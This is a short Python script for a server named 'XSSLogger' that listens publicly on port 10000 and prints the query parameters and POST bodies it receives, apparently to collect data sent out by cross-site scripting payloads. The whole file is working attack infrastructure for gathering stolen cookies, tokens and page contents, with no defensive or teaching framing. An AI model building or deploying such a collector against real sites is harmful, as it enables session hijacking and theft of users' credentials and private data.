from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class XSSLogger(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[+] Request: {self.path}")
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        for key, value in params.items():
            print(f"    {key}: {value}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        print("[+] POST data:", post_data)
        self.send_response(200)
        self.end_headers()

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 10000), XSSLogger)  # Port Render will assign
    print("Listening on port 10000...")
    server.serve_forever()
